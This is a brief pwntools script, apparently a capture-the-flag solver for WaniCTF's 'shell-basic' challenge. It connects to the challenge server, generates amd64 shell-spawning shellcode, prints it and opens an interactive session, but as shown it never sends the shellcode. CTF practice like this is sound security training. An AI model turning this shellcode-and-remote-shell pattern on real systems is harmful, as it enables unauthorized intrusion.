from pwn import *

# pc = process("./chall")
host = "shell-basic-pwn.wanictf.org"
port = 9004

pc = remote(host,port)
shellcode = asm(shellcraft.amd64.sh())
print(shellcode)
pc.interactive()
